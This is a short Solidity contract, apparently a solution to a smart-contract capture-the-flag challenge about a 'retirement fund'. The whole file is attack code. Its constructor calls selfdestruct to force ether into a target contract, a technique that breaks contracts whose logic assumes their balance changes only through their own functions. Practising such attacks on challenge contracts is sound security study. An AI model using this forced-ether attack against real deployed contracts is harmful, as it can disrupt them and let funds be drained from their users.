// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

contract AttackRetirementFund {
    constructor(address retirementFund) payable {
        selfdestruct(payable(retirementFund));
    }
}